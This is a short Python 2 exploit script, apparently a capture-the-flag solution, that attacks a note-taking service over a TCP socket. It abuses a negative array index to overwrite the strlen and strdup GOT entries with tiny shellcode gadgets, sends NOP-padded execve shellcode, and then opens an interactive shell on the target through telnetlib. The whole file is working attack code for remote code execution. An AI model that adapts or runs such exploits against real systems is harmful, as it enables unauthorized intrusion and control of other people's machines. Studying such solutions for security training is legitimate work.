import sys
import socket
import telnetlib

def ru(s, u):
  z = ''
  while z.endswith(u) == False:
    z += s.recv(1)

  return z

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( (sys.argv[1], int(sys.argv[2])))

ru(s, 'choice: ')

s.send('1\n')
ru(s, 'ex: ')

strdup = 0x202080
note_array = 0x2020e0
strlen = 0x202028
index = ( note_array - strlen) / 8

## -23
s.send('-' + str(index) + '\n')
ru( s, 'te: ')
s.send('1\n')
ru(s, 'nt: ')

## mov rax, rbx; ret
## this allows me to sent 7 bytes instead of 3 by overwriting strlen
s.send('\x89\xd8\xc3\n')
ru( s, 'ice: ')

s.send('1\n')
ru(s, 'ex: ')
s.send('-' + str( (note_array-strdup) / 8) + '\n')
ru(s, 'te: ')
s.send('1\n')
ru(s, 'nt: ')

## call rdi; xor rax, rax, ret with a newline
## this allows every 7 bytes of an add note to be executed.
s.send('\xff\xd7\x48\x31\xc0\xc3\x0a')
ru( s, 'ice: ')

raw_input('...')

s.send('1\n')
ru(s, 'ex: ')
s.send('0\n')
ru(s, 'te: ')
s.send('1\n')
ru(s, 'nt: ')

f = open('execve', 'rb')
sc = f.read()
f.close()

sc = '\x90'*(100-len(sc)) + '\x90\x90' + sc

line = '\x52\x5f\x52\x58\xb2\xff\x0f\x05'
s.send(line)
s.send(sc)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

